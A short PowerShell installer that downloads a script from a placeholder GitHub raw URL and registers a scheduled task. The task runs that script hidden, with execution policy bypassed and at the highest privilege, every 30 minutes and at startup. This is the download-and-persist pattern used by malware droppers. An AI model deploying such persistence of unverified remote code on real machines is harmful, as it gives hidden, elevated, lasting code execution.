

# ── settings ────────────────────────────────────────────────────────────────
$rawUrl = "raw.githubusercontent.com/test/test/refs/heads/main/test.ps1"
$destination = Join-Path $PSScriptRoot "jumping.ps1"
$taskName = "AutoJumping"
$intervalMinutes = 30
# ─────────────────────────────────────────────────────────────────────────────


Write-Host "Downloading jumping.ps1..."
Invoke-WebRequest -Uri $rawUrl -OutFile $destination -UseBasicParsing
Write-Host "Saved: $destination"


$action = New-ScheduledTaskAction `
    -Execute  "powershell.exe" `
    -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$destination`""

$triggerRepeat = New-ScheduledTaskTrigger `
    -Once `
    -At                 ((Get-Date).AddMinutes(1)) `
    -RepetitionInterval ([TimeSpan]::FromMinutes($intervalMinutes))

$triggerBoot = New-ScheduledTaskTrigger -AtStartup

$settings = New-ScheduledTaskSettingsSet `
    -AllowStartIfOnBatteries `
    -DontStopIfGoingOnBatteries `
    -StartWhenAvailable `
    -ExecutionTimeLimit ([TimeSpan]::Zero)

Register-ScheduledTask `
    -TaskName $taskName `
    -Action   $action `
    -Trigger  @($triggerRepeat, $triggerBoot) `
    -Settings $settings `
    -RunLevel Highest `
    -Force | Out-Null

Write-Host ""
Write-Host "Done! Task '$taskName' registered."
Write-Host "  Runs every $intervalMinutes min + at every system startup."
Write-Host "  init.ps1 is no longer needed."
